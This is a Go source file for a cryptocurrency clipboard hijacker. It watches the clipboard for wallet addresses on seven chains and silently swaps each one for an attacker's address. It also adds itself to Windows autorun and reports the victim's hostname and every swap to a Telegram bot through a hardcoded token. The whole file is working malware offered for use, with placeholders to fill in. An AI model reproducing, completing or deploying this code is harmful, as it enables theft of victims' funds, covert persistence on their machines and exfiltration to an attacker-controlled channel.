package main

import (
	"fmt"
	"os"
	"regexp"
	"time"

	"github.com/atotto/clipboard"
)

var (
	btcRegex     = regexp.MustCompile(`^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`)
	ethRegex     = regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	ltcRegex     = regexp.MustCompile(`^(L|M)[A-Za-z0-9]{33}$|^ltc1[a-zA-Z0-9]{39,59}$`)
	dogeRegex    = regexp.MustCompile(`^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$`)
	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9a-zA-Z_-]{46,48}$`)
	usdttrcRegex = regexp.MustCompile(`^T[A-Za-z0-9]{33}$`)
	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
)

type coinMatcher struct {
	regex *regexp.Regexp
	addr  string
}

/* *** change this *** */
var matchers = []coinMatcher{
	{btcRegex, "btc_clipped"},         // BTC
	{ethRegex, "eth_clipped"},         // ETH
	{ltcRegex, "ltc_clipped"},         // LTC
	{dogeRegex, "doge_clipped"},       // DOGE
	{tonRegex, "ton_clipped"},         // TON
	{usdttrcRegex, "usdttrc_clipped"}, // USDT TRC20
	{solRegex, "sol_clipped"},         // Solana
}

/* *** change this *** */
var (
	bot_token = "8544283395:AAGwBn1O27AyGnFA5XfKc9S7rdILbSkiq5s"
	chat_id   = "7336461438" // u can use group (starts with -100) or chat id
)

func main() {
	hostname, _ := os.Hostname() // pc hostname (like DESKTOP-TEST123)

	// send start log to telegram
	SendLog(fmt.Sprintf(
		"Connected - %s",
		hostname,
	), chat_id, bot_token)

	// we adding self to windows autorun
	selfDir, _ := GetSelfDir()
	_ = AddToAutorun(selfDir, "sys")

	// we starting main clipper process
	var lastClipboardContent string

	for {
		time.Sleep(900 * time.Millisecond)

		currentContent, err := clipboard.ReadAll()
		if err != nil {
			continue
		}

		if currentContent == lastClipboardContent {
			continue
		}

		matched := false
		for _, matcher := range matchers {
			if matcher.regex.MatchString(currentContent) {
				originalAddr := currentContent

				err = clipboard.WriteAll(matcher.addr)
				if err != nil {
					continue
				}

				SendLog(
					fmt.Sprintf(
						"%s\n\n%s → %s",
						hostname,
						originalAddr,
						matcher.addr,
					),
					chat_id,
					bot_token,
				)

				lastClipboardContent = originalAddr
				matched = true

				break
			}
		}

		if !matched {
			lastClipboardContent = currentContent
		}
	}
}
